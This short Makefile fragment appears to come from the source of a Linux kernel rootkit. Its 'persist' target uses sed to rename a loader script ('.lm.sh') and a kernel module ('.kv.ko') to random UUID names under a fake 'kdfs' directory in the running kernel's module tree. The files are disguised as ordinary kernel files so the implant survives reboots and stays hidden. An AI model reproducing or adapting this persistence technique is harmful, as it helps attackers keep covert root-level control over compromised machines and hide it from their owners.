...
persist:
	sed -i "s|.lm.sh|lib/modules/$(shell uname -r)/kernel/fs/kdfs/${UUIDGEN}.sh|g" $(persist).S
	sed -i "s|.kv.ko|lib/modules/$(shell uname -r)/kernel/fs/kdfs/${UUIDGEN}.ko|g" $(persist).S
